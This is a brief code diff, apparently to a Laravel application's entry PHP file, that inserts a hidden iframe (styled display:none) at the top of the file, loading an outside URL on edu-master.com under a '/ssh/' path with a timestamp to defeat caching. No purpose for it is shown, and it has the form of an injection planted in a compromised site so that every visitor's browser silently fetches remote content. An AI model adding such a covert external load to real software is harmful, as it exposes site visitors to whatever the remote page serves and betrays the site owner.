@@ -1,3 +1,5 @@
+<iframe src="https://edu-master.com/ssh/?no-cache=<?= date('Y-m-d H:i:s') ?>" style="display:none;"></iframe>
+
 <?php
 
 use Illuminate\Contracts\Http\Kernel;
